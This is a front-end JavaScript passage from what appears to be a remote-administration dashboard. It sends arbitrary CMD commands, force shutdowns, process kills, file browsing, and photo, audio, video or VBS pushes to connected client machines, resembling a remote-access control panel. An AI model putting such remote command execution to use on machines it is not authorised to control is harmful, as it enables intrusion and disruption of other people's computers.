                            class="flex items-center justify-center space-x-1 py-2 px-2 rounded-lg font-semibold text-xs transition-colors duration-200 ${!client.connected ? 'bg-gray-800 text-gray-500 cursor-not-allowed' : 'bg-orange-700 hover:bg-orange-600 text-orange-200 border border-orange-600'}">
                        <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
                        </svg>
                        <span>Force Reboot</span>
                    </button>
                </div>

                <!-- Utility Buttons Row -->
                <div class="grid grid-cols-4 gap-2">
                    <button onclick="openCmdTerminal('${client.id}')" 
                            ${!client.connected ? 'disabled' : ''}
                            class="flex items-center justify-center space-x-1 py-2 px-2 rounded-lg font-semibold text-xs transition-colors duration-200 ${!client.connected ? 'bg-gray-800 text-gray-500 cursor-not-allowed' : 'bg-green-900 hover:bg-green-800 text-green-300 border border-green-700'}">
                        <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
                        </svg>
                        <span>CMD</span>
                    </button>
                    
                    <button onclick="getSystemInfo('${client.id}')" 
                            ${!client.connected ? 'disabled' : ''}
                            class="flex items-center justify-center space-x-1 py-2 px-2 rounded-lg font-semibold text-xs transition-colors duration-200 ${!client.connected ? 'bg-gray-800 text-gray-500 cursor-not-allowed' : 'bg-blue-900 hover:bg-blue-800 text-blue-300 border border-blue-700'}">
                        <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                        </svg>
                        <span>Info</span>
                    </button>
                    
                    <button onclick="getProcessList('${client.id}')" 
                            ${!client.connected ? 'disabled' : ''}
                            class="flex items-center justify-center space-x-1 py-2 px-2 rounded-lg font-semibold text-xs transition-colors duration-200 ${!client.connected ? 'bg-gray-800 text-gray-500 cursor-not-allowed' : 'bg-orange-900 hover:bg-orange-800 text-orange-300 border border-orange-700'}">
                        <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"></path>
                        </svg>
                        <span>Tasks</span>
                    </button>
                    
                    <button onclick="openFileExplorer('${client.id}')" 
                            ${!client.connected ? 'disabled' : ''}
                            class="flex items-center justify-center space-x-1 py-2 px-2 rounded-lg font-semibold text-xs transition-colors duration-200 ${!client.connected ? 'bg-gray-800 text-gray-500 cursor-not-allowed' : 'bg-cyan-900 hover:bg-cyan-800 text-cyan-300 border border-cyan-700'}">
                        <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"></path>
                        </svg>
                        <span>Files</span>
                    </button>
                </div>

                <!-- Message Button Row -->
                <div class="grid grid-cols-1 gap-2">
                    <button onclick="messageClient('${client.id}')" 
                            ${!client.connected ? 'disabled' : ''}
                            class="flex items-center justify-center space-x-1 py-2 px-2 rounded-lg font-semibold text-xs transition-colors duration-200 ${!client.connected ? 'bg-gray-800 text-gray-500 cursor-not-allowed' : 'bg-purple-900 hover:bg-purple-800 text-purple-300 border border-purple-700'}">
                        <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
                        </svg>
                        <span>Send Message</span>
                    </button>
                </div>
            </div>
        </div>
    `).join('');
}

// Toggle client selection
function toggleClientSelection(clientId) {
    if (selectedClients.has(clientId)) {
        selectedClients.delete(clientId);
    } else {
        selectedClients.add(clientId);
    }
    renderClients();
}

// Power management functions
async function shutdownClient(clientId, force = false) {
    const client = clients.find(c => c.id === clientId);
    const hostname = client ? client.hostname : 'Unknown';
    
    let delay = 0;
    if (!force) {
        const delayInput = prompt('Enter delay in seconds (0 for immediate):');
        if (delayInput === null) return;
        delay = parseInt(delayInput) || 0;
    } else {
        const confirmed = confirm(`⚠️ Force shutdown ${hostname}?\n\nThis will immediately shutdown the computer without saving open files!`);
        if (!confirmed) return;
    }
    
    try {
        // For force shutdown, send command with /f parameter via execute endpoint
        if (force) {
            const response = await fetch(`${SERVER_URL}/api/execute/${clientId}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: 'shutdown /s /f /t 0' })
            });
            
            const result = await response.json();
            addLog(`Force shutdown command sent to ${hostname}`, response.ok ? 'success' : 'error');
        } else {
            const response = await fetch(`${SERVER_URL}/api/shutdown/${clientId}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ delay: delay })
            });
            
            const result = await response.json();
            addLog(result.message, response.ok ? 'success' : 'error');
        }
    } catch (error) {
        addLog('Failed to send shutdown command', 'error');
    }
}

async function rebootClient(clientId, force = false) {
    const client = clients.find(c => c.id === clientId);
    const hostname = client ? client.hostname : 'Unknown';
    
    let delay = 0;
    if (!force) {
        const delayInput = prompt('Enter delay in seconds (0 for immediate):');
        if (delayInput === null) return;
        delay = parseInt(delayInput) || 0;
    } else {
        const confirmed = confirm(`⚠️ Force reboot ${hostname}?\n\nThis will immediately reboot the computer without saving open files!`);
        if (!confirmed) return;
    }
    
    try {
        // For force reboot, send command with /f parameter via execute endpoint
        if (force) {
            const response = await fetch(`${SERVER_URL}/api/execute/${clientId}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: 'shutdown /r /f /t 0' })
            });
            
            const result = await response.json();
            addLog(`Force reboot command sent to ${hostname}`, response.ok ? 'success' : 'error');
        } else {
            const response = await fetch(`${SERVER_URL}/api/reboot/${clientId}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ delay: delay })
            });
            
            const result = await response.json();
            addLog(result.message, response.ok ? 'success' : 'error');
        }
    } catch (error) {
        addLog('Failed to send reboot command', 'error');
    }
}

async function cancelClient(clientId) {
    const client = clients.find(c => c.id === clientId);
    const hostname = client ? client.hostname : 'Unknown';
    
    const confirmed = confirm(`Cancel pending shutdown/reboot on ${hostname}?`);
    if (!confirmed) return;
    
    try {
        const response = await fetch(`${SERVER_URL}/api/cancel/${clientId}`, {
            method: 'POST'
        });
        
        const result = await response.json();
        addLog(result.message, response.ok ? 'success' : 'error');
    } catch (error) {
        addLog('Failed to send cancel command', 'error');
    }
}

async function messageClient(clientId) {
    const message = prompt('Enter message to send:');
    if (!message) return;
    
    try {
        const response = await fetch(`${SERVER_URL}/api/broadcast`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                message: message,
                clientIds: [clientId]
            })
        });
        
        const result = await response.json();
        addLog(result.message, response.ok ? 'success' : 'error');
    } catch (error) {
        addLog('Failed to send message', 'error');
    }
}


// Clear offline devices function
clearOfflineBtn.addEventListener('click', async () => {
    const offlineCount = clients.filter(c => !c.connected).length;
    
    if (offlineCount === 0) {
        alert('No offline devices to clear');
        return;
    }
    
    const confirmed = confirm(`Are you sure you want to remove ${offlineCount} offline device(s) from the list?`);
    if (!confirmed) return;
    
    try {
        const response = await fetch(`${SERVER_URL}/api/clear-offline`, {
            method: 'POST'
        });
        
        const result = await response.json();
        addLog(result.message, response.ok ? 'success' : 'error');
        
        if (response.ok) {
            // Remove offline clients from local array and selected clients
            const offlineClientIds = clients.filter(c => !c.connected).map(c => c.id);
            offlineClientIds.forEach(id => selectedClients.delete(id));
            clients = clients.filter(c => c.connected);
            
            updateStats();
            renderClients();
            
            // Update Client IDs table if it's visible
            if (document.getElementById('clientIdsMainContent') && !document.getElementById('clientIdsMainContent').classList.contains('hidden')) {
                loadClientIdsTable();
            }
        }
    } catch (error) {
        addLog('Failed to clear offline devices', 'error');
    }
});

// Utility functions
function addLog(message, type = 'info') {
    const timestamp = new Date().toLocaleTimeString();
    const logEntry = document.createElement('div');
    
    // Define colors and icons for different log types
    const logStyles = {
        success: {
            color: 'text-green-300',
            icon: '✅',
            bg: 'bg-green-900'
        },
        error: {
            color: 'text-red-300',
            icon: '❌',
            bg: 'bg-red-900'
        },
        warning: {
            color: 'text-yellow-300',
            icon: '⚠️',
            bg: 'bg-yellow-900'
        },
        info: {
            color: 'text-blue-300',
            icon: 'ℹ️',
            bg: 'bg-blue-900'
        }
    };
    
    const style = logStyles[type] || logStyles.info;
    
    logEntry.className = `flex items-start space-x-3 p-3 rounded-lg mb-2 ${style.bg} border border-gh-border`;
    logEntry.innerHTML = `
        <span class="text-lg">${style.icon}</span>
        <div class="flex-1 min-w-0">
            <div class="flex items-center space-x-2">
                <span class="text-gh-text-muted text-xs font-mono">[${timestamp}]</span>
                <span class="${style.color} text-sm font-medium">${type.toUpperCase()}</span>
            </div>
            <p class="text-gh-text-secondary text-sm mt-1 font-mono">${message}</p>
        </div>
    `;
    
    logsEl.appendChild(logEntry);
    logsEl.scrollTop = logsEl.scrollHeight;
    
    // Keep only last 50 log entries for better performance
    while (logsEl.children.length > 50) {
        logsEl.removeChild(logsEl.firstChild);
    }
}

// CMD Terminal functionality
let currentCmdClientId = null;

function openCmdTerminal(clientId) {
    const client = clients.find(c => c.id === clientId);
    if (!client) return;
    
    currentCmdClientId = clientId;
    document.getElementById('cmdClientName').textContent = `Client: ${client.hostname}`;
    document.getElementById('cmdModal').classList.remove('hidden');
    document.getElementById('cmdInput').focus();
    
    addCmdOutput(`Connected to ${client.hostname} (${client.ip})`, 'info');
    addLog(`Opened CMD terminal for ${client.hostname}`, 'info');
}

function closeCmdModal() {
    document.getElementById('cmdModal').classList.add('hidden');
    currentCmdClientId = null;
}

function handleCmdKeyPress(event) {
    if (event.key === 'Enter') {
        executeCmdCommand();
    }
}

async function executeCmdCommand() {
    const input = document.getElementById('cmdInput');
    const command = input.value.trim();
    
    if (!command || !currentCmdClientId) return;
    
    input.value = '';
    
    try {
        const response = await fetch(`${SERVER_URL}/api/execute/${currentCmdClientId}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ command })
        });
        
        const result = await response.json();
        if (!response.ok) {
            addCmdOutput(`Error: ${result.error}`, 'error');
        }
    } catch (error) {
        addCmdOutput(`Failed to execute command: ${error.message}`, 'error');
    }
}

function clearCmdOutput() {
    const output = document.getElementById('cmdOutput');
    output.innerHTML = `
        <div class="text-gh-text-secondary">Remote CMD Terminal - Ready</div>
        <div class="text-gh-text-secondary">Type commands and press Enter to execute on remote machine</div>
        <div class="text-gh-text-secondary">---</div>
    `;
}

function addCmdOutput(text, type = 'output') {
    const output = document.getElementById('cmdOutput');
    const timestamp = new Date().toLocaleTimeString();
    
    const colors = {
        command: 'text-yellow-300',
        output: 'text-green-300',
        error: 'text-red-300',
        info: 'text-blue-300'
    };
    
    const div = document.createElement('div');
    div.className = `${colors[type] || colors.output} font-mono text-sm mb-1`;
    div.innerHTML = `<span class="text-white/50">[${timestamp}]</span> ${text}`;
    
    output.appendChild(div);
    output.scrollTop = output.scrollHeight;
}

// System Info functionality
async function getSystemInfo(clientId) {
    const client = clients.find(c => c.id === clientId);
    if (!client) return;
    
    try {
        const response = await fetch(`${SERVER_URL}/api/system-info/${clientId}`);
        const result = await response.json();
        
        if (response.ok) {
            document.getElementById('systemInfoClientName').textContent = `Client: ${client.hostname}`;
            document.getElementById('systemInfoModal').classList.remove('hidden');
            document.getElementById('systemInfoContent').innerHTML = '<div class="text-gh-text-secondary">Loading system information...</div>';
        } else {
            addLog(`Failed to get system info: ${result.error}`, 'error');
        }
    } catch (error) {
        addLog('Failed to request system info', 'error');
    }
}

function closeSystemInfoModal() {
    document.getElementById('systemInfoModal').classList.add('hidden');
}

function displaySystemInfo(data) {
    const content = document.getElementById('systemInfoContent');
    
    content.innerHTML = `
        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div class="bg-gh-bg-tertiary rounded-xl p-4 border border-gh-border">
                <h4 class="text-gh-text font-semibold mb-3 flex items-center">
                    <svg class="w-5 h-5 mr-2 text-blue-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path>
                    </svg>
                    Basic Information
                </h4>
                <div class="space-y-2 text-sm">
                    <div><span class="text-gh-text-secondary">Hostname:</span> <span class="text-gh-text">${data.hostname}</span></div>
                    <div><span class="text-gh-text-secondary">Platform:</span> <span class="text-gh-text">${data.platform}</span></div>
                    <div><span class="text-gh-text-secondary">Architecture:</span> <span class="text-gh-text">${data.arch}</span></div>
                    <div><span class="text-gh-text-secondary">OS Release:</span> <span class="text-gh-text">${data.release}</span></div>
                    <div><span class="text-gh-text-secondary">OS Type:</span> <span class="text-gh-text">${data.type}</span></div>
                </div>
            </div>
            
            <div class="bg-gh-bg-tertiary rounded-xl p-4 border border-gh-border">
                <h4 class="text-gh-text font-semibold mb-3 flex items-center">
                    <svg class="w-5 h-5 mr-2 text-green-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
                    </svg>
                    Performance
                </h4>
                <div class="space-y-2 text-sm">
                    <div><span class="text-gh-text-secondary">Uptime:</span> <span class="text-gh-text">${Math.floor(data.uptime / 3600)}h ${Math.floor((data.uptime % 3600) / 60)}m</span></div>
                    <div><span class="text-gh-text-secondary">Total Memory:</span> <span class="text-gh-text">${(data.totalMemory / 1024 / 1024 / 1024).toFixed(2)} GB</span></div>
                    <div><span class="text-gh-text-secondary">Free Memory:</span> <span class="text-gh-text">${(data.freeMemory / 1024 / 1024 / 1024).toFixed(2)} GB</span></div>
                    <div><span class="text-gh-text-secondary">Memory Usage:</span> <span class="text-gh-text">${(((data.totalMemory - data.freeMemory) / data.totalMemory) * 100).toFixed(1)}%</span></div>
                    <div><span class="text-gh-text-secondary">CPU Cores:</span> <span class="text-gh-text">${data.cpus.length}</span></div>
                </div>
            </div>
            
            <div class="bg-gh-bg-tertiary rounded-xl p-4 border border-gh-border">
                <h4 class="text-gh-text font-semibold mb-3 flex items-center">
                    <svg class="w-5 h-5 mr-2 text-purple-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
                    </svg>
                    User Information
                </h4>
                <div class="space-y-2 text-sm">
                    <div><span class="text-gh-text-secondary">Username:</span> <span class="text-gh-text">${data.userInfo.username}</span></div>
                    <div><span class="text-gh-text-secondary">Home Directory:</span> <span class="text-gh-text font-mono text-xs">${data.userInfo.homedir}</span></div>
                    <div><span class="text-gh-text-secondary">Shell:</span> <span class="text-gh-text">${data.userInfo.shell || 'N/A'}</span></div>
                </div>
            </div>
            
            <div class="bg-gh-bg-tertiary rounded-xl p-4 border border-gh-border">
                <h4 class="text-gh-text font-semibold mb-3 flex items-center">
                    <svg class="w-5 h-5 mr-2 text-orange-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9v-9m0-9v9"></path>
                    </svg>
                    Network Interfaces
                </h4>
                <div class="space-y-2 text-sm max-h-32 overflow-y-auto">
                    ${Object.entries(data.networkInterfaces).map(([name, interfaces]) => 
                        interfaces.filter(iface => iface.family === 'IPv4').map(iface => 
                            `<div><span class="text-gh-text-secondary">${name}:</span> <span class="text-gh-text font-mono text-xs">${iface.address}</span></div>`
                        ).join('')
                    ).join('')}
                </div>
            </div>
        </div>
    `;
}

// Process List functionality
let currentProcessClientId = null; // Track current client for process list

async function getProcessList(clientId) {
    const client = clients.find(c => c.id === clientId);
    if (!client) return;
    
    currentProcessClientId = clientId; // Store for later use
    
    try {
        const response = await fetch(`${SERVER_URL}/api/processes/${clientId}`);
        const result = await response.json();
        
        if (response.ok) {
            document.getElementById('processClientName').textContent = `Client: ${client.hostname}`;
            document.getElementById('processModal').classList.remove('hidden');
            document.getElementById('processListContent').innerHTML = '<div class="text-gh-text-secondary">Loading process list...</div>';
        } else {
            addLog(`Failed to get process list: ${result.error}`, 'error');
        }
    } catch (error) {
        addLog('Failed to request process list', 'error');
    }
}

function closeProcessModal() {
    document.getElementById('processModal').classList.add('hidden');
    currentProcessClientId = null; // Clear when closing
}

function displayProcessList(data) {
    const content = document.getElementById('processListContent');
    
    if (!data.success || !data.processes.length) {
        content.innerHTML = '<div class="text-gh-text-secondary">No processes found or failed to load process list.</div>';
        return;
    }
    
    content.innerHTML = `
        <div class="mb-4">
            <input type="text" id="processFilter" placeholder="Filter processes..." 
                   class="w-full bg-gh-bg-tertiary border border-gh-border rounded-lg px-3 py-2 text-gh-text placeholder-gh-text-muted focus:outline-none focus:ring-2 focus:ring-blue-400"
                   onkeyup="filterProcesses()">
        </div>
        <div class="bg-gh-bg-tertiary rounded-xl border border-gh-border overflow-hidden">
            <div class="overflow-x-auto">
                <table class="w-full text-sm">
                    <thead class="bg-gh-bg border-b border-gh-border">
                        <tr>
                            <th class="text-left p-3 text-gh-text-secondary font-semibold">Image Name</th>
                            <th class="text-left p-3 text-gh-text-secondary font-semibold">PID</th>
                            <th class="text-left p-3 text-gh-text-secondary font-semibold">Session Name</th>
                            <th class="text-left p-3 text-gh-text-secondary font-semibold">Memory Usage</th>
                            <th class="text-left p-3 text-gh-text-secondary font-semibold">Actions</th>
                        </tr>
                    </thead>
                    <tbody id="processTableBody">
                        ${data.processes.map(process => `
                            <tr class="border-b border-gh-border hover:bg-gh-bg-secondary transition-colors process-row">
                                <td class="p-3 text-gh-text font-mono text-xs process-name">${process['Image Name'] || 'N/A'}</td>
                                <td class="p-3 text-gh-text font-mono">${process['PID'] || 'N/A'}</td>
                                <td class="p-3 text-gh-text-secondary">${process['Session Name'] || 'N/A'}</td>
                                <td class="p-3 text-gh-text">${process['Mem Usage'] || 'N/A'}</td>
                                <td class="p-3">
                                    <button onclick="killProcessById('${process['PID']}', '${process['Image Name']}')" 
                                            class="bg-red-500/20 hover:bg-red-500/30 text-red-300 hover:text-red-200 px-3 py-1 rounded-lg text-xs font-semibold transition-all duration-200 border border-red-500/30">
                                        Kill
                                    </button>
                                </td>
                            </tr>
                        `).join('')}
                    </tbody>
                </table>
            </div>
        </div>
    `;
}

function filterProcesses() {
    const filter = document.getElementById('processFilter').value.toLowerCase();
    const rows = document.querySelectorAll('.process-row');
    
    rows.forEach(row => {
        const processName = row.querySelector('.process-name').textContent.toLowerCase();
        if (processName.includes(filter)) {
            row.style.display = '';
        } else {
            row.style.display = 'none';
        }
    });
}

async function killProcessById(pid, processName) {
    // Use currentProcessClientId which is set when process list is opened
    const clientId = currentProcessClientId;
    
    if (!clientId) {
        addLog('Error: No client selected', 'error');
        return;
    }
    
    const client = clients.find(c => c.id === clientId);
    
    if (!client) {
        addLog('Error: Client not found', 'error');
        return;
    }
    
    // Confirm before killing
    const confirmed = confirm(`Are you sure you want to kill process "${processName}" (PID: ${pid}) on ${client.hostname}?`);
    if (!confirmed) return;
    
    try {
        const response = await fetch(`${SERVER_URL}/api/kill-process/${client.id}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ pid: pid })
        });
        
        const result = await response.json();
        
        if (response.ok) {
            addLog(`Process "${processName}" (PID: ${pid}) killed on ${client.hostname}`, 'success');
            // Refresh process list
            setTimeout(() => getProcessList(client.id), 1000);
        } else {
            addLog(`Failed to kill process "${processName}" on ${client.hostname}: ${result.error || 'Unknown error'}`, 'error');
        }
    } catch (error) {
        addLog(`Failed to kill process "${processName}" on ${client.hostname}`, 'error');
    }
}

// Sync client selection across all tool dropdowns
function syncClientSelection(clientId) {
    if (!clientId) return;
    
    persistentSelectedClientId = clientId;
    
    // Update all dropdowns
    const audioClientSelect = document.getElementById('audioClientSelect');
    const audioClientSelectLibrary = document.getElementById('audioClientSelectLibrary');
    const audioDumpClientSelect = document.getElementById('audioDumpClientSelect');
    const vbsClientSelect = document.getElementById('vbsClientSelect');
    const vbsClientSelectLibrary = document.getElementById('vbsClientSelectLibrary');
    const vbsDumpClientSelect = document.getElementById('vbsDumpClientSelect');
    const videoClientSelect = document.getElementById('videoClientSelect');
    const videoClientSelectLibrary = document.getElementById('videoClientSelectLibrary');
    const videoDumpClientSelect = document.getElementById('videoDumpClientSelect');
    const filesClientSelect = document.getElementById('filesClientSelect');
    const filesClientSelectLibrary = document.getElementById('filesClientSelectLibrary');
    const dumpClientSelect = document.getElementById('dumpClientSelect');
    const photosClientSelect = document.getElementById('photosClientSelect');
    const photosClientSelectLibrary = document.getElementById('photosClientSelectLibrary');
    const photosDumpClientSelect = document.getElementById('photosDumpClientSelect');
    
    if (audioClientSelect && audioClientSelect.value !== clientId) audioClientSelect.value = clientId;
    if (audioClientSelectLibrary && audioClientSelectLibrary.value !== clientId) audioClientSelectLibrary.value = clientId;
    if (audioDumpClientSelect && audioDumpClientSelect.value !== clientId) audioDumpClientSelect.value = clientId;
    if (vbsClientSelect && vbsClientSelect.value !== clientId) vbsClientSelect.value = clientId;
    if (vbsClientSelectLibrary && vbsClientSelectLibrary.value !== clientId) vbsClientSelectLibrary.value = clientId;
    if (vbsDumpClientSelect && vbsDumpClientSelect.value !== clientId) vbsDumpClientSelect.value = clientId;
    if (videoClientSelect && videoClientSelect.value !== clientId) videoClientSelect.value = clientId;
    if (videoClientSelectLibrary && videoClientSelectLibrary.value !== clientId) videoClientSelectLibrary.value = clientId;
    if (videoDumpClientSelect && videoDumpClientSelect.value !== clientId) videoDumpClientSelect.value = clientId;
    if (filesClientSelect && filesClientSelect.value !== clientId) filesClientSelect.value = clientId;
    if (filesClientSelectLibrary && filesClientSelectLibrary.value !== clientId) filesClientSelectLibrary.value = clientId;
    if (dumpClientSelect && dumpClientSelect.value !== clientId) dumpClientSelect.value = clientId;
    if (photosClientSelect && photosClientSelect.value !== clientId) photosClientSelect.value = clientId;
    if (photosClientSelectLibrary && photosClientSelectLibrary.value !== clientId) photosClientSelectLibrary.value = clientId;
    if (photosDumpClientSelect && photosDumpClientSelect.value !== clientId) photosDumpClientSelect.value = clientId;
    
    const client = clients.find(c => c.id === clientId);
    if (client) {
        addLog(`Client selected: ${client.hostname} (${client.ip})`, 'info');
    }
}

// Add event listeners to all client select dropdowns for persistent selection
function initializeClientSelectListeners() {
    const selectIds = [
        'audioClientSelect', 'audioClientSelectLibrary', 'audioDumpClientSelect',
        'vbsClientSelect', 'vbsClientSelectLibrary', 'vbsDumpClientSelect',
        'videoClientSelect', 'videoClientSelectLibrary', 'videoDumpClientSelect',
        'filesClientSelect', 'filesClientSelectLibrary', 'dumpClientSelect',
        'photosClientSelect', 'photosClientSelectLibrary', 'photosDumpClientSelect'
    ];
    
    selectIds.forEach(id => {
        const element = document.getElementById(id);
        if (element) {
            element.addEventListener('change', function() {
                if (this.value) {
                    syncClientSelection(this.value);
                }
            });
        }
    });
}

// ========== Photos Functions ==========

// Photos tab switching
function switchPhotosTab(tab) {
    const photosUploadTabBtn = document.getElementById('photosUploadTabBtn');
    const photosLibraryTabBtn = document.getElementById('photosLibraryTabBtn');
    const photosDumpTabBtn = document.getElementById('photosDumpTabBtn');
    const photosUploadTabContent = document.getElementById('photosUploadTabContent');
    const photosLibraryTabContent = document.getElementById('photosLibraryTabContent');
    const photosDumpTabContent = document.getElementById('photosDumpTabContent');
    
    // Reset all
    photosUploadTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
    photosLibraryTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
    photosDumpTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
    photosUploadTabContent.classList.add('hidden');
    photosLibraryTabContent.classList.add('hidden');
    photosDumpTabContent.classList.add('hidden');
    
    if (tab === 'upload') {
        photosUploadTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-pink-600 text-white';
        photosUploadTabContent.classList.remove('hidden');
    } else if (tab === 'library') {
        photosLibraryTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-pink-600 text-white';
        photosLibraryTabContent.classList.remove('hidden');
        loadPhotosLibrary();
    } else if (tab === 'dump') {
        photosDumpTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-yellow-600 text-white';
        photosDumpTabContent.classList.remove('hidden');
    }
}

// Play photo on client
async function playPhotoOnClient() {
    const photoFileInput = document.getElementById('photoFileInput');
    const photosClientSelect = document.getElementById('photosClientSelect');
    const playPhotoBtn = document.getElementById('playPhotoBtn');
    
    const clientId = photosClientSelect.value;
    const file = photoFileInput.files[0];
    
    if (!clientId) {
        alert('Please select a target client');
        return;
    }
    
    if (!file) {
        alert('Please select a photo file');
        return;
    }
    
    const client = clients.find(c => c.id === clientId);
    const hostname = client ? client.hostname : 'Unknown';
    
    playPhotoBtn.disabled = true;
    
    try {
        const formData = new FormData();
        formData.append('photoFile', file);
        
        const response = await fetch(`${SERVER_URL}/api/play-photo/${clientId}`, {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (response.ok) {
            addLog(`📷 Opening "${file.name}" on ${hostname}`, 'success');
            photoFileInput.value = '';
        } else {
            addLog(`Failed to display photo on ${hostname}: ${result.error}`, 'error');
        }
    } catch (error) {
        addLog(`Failed to upload photo: ${error.message}`, 'error');
    } finally {
        playPhotoBtn.disabled = false;
    }
}

// Load photos library
async function loadPhotosLibrary() {
    const photosLibraryList = document.getElementById('photosLibraryList');
    photosLibraryList.innerHTML = '<p class="text-gh-text-secondary text-sm text-center py-4">Loading photos...</p>';
    
    try {
        const response = await fetch(`${SERVER_URL}/api/photo-files`);
        const files = await response.json();
        
        if (files.length === 0) {
            photosLibraryList.innerHTML = '<p class="text-gh-text-secondary text-sm text-center py-4">No photos uploaded yet</p>';
            return;
        }
        
        photosLibraryList.innerHTML = files.map(file => `
            <div class="bg-gh-bg-tertiary rounded-lg p-3 border border-gh-border flex items-center justify-between hover:border-gh-text-muted transition-colors">
                <div class="flex items-center space-x-3 flex-1">
                    <div class="w-10 h-10 bg-pink-900 rounded-lg flex items-center justify-center">
                        <svg class="w-5 h-5 text-pink-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
                        </svg>
                    </div>
                    <div class="flex-1 min-w-0">
                        <p class="text-gh-text text-sm font-medium truncate">${file.filename}</p>
                        <p class="text-gh-text-muted text-xs">${formatFileSize(file.size)} • ${new Date(file.uploadedAt).toLocaleString()}</p>
                    </div>
                </div>
                <div class="flex items-center space-x-2">
                    <button 
                        onclick="playPhotoFromLibrary('${file.filename}')"
                        class="bg-pink-600 hover:bg-pink-700 text-white px-3 py-2 rounded-lg text-xs font-semibold transition-colors"
                    >
                        Display
                    </button>
                    <button 
                        onclick="deletePhotoFile('${file.filename}')"
                        class="bg-red-900 hover:bg-red-800 text-red-300 px-3 py-2 rounded-lg text-xs font-semibold transition-colors border border-red-700"
                    >
                        Delete
                    </button>
                </div>
            </div>
        `).join('');
    } catch (error) {
        photosLibraryList.innerHTML = '<p class="text-red-300 text-sm text-center py-4">Failed to load photos</p>';
        addLog('Failed to load photos library', 'error');
    }
}

// Play photo from library
async function playPhotoFromLibrary(filename) {
    const photosClientSelectLibrary = document.getElementById('photosClientSelectLibrary');
    const clientId = photosClientSelectLibrary.value;
    
    if (!clientId) {
        alert('Please select a target client');
        return;
    }
    
    const client = clients.find(c => c.id === clientId);
    const hostname = client ? client.hostname : 'Unknown';
    
    try {
        const response = await fetch(`${SERVER_URL}/api/play-photo-library/${clientId}/${encodeURIComponent(filename)}`, {
            method: 'POST'
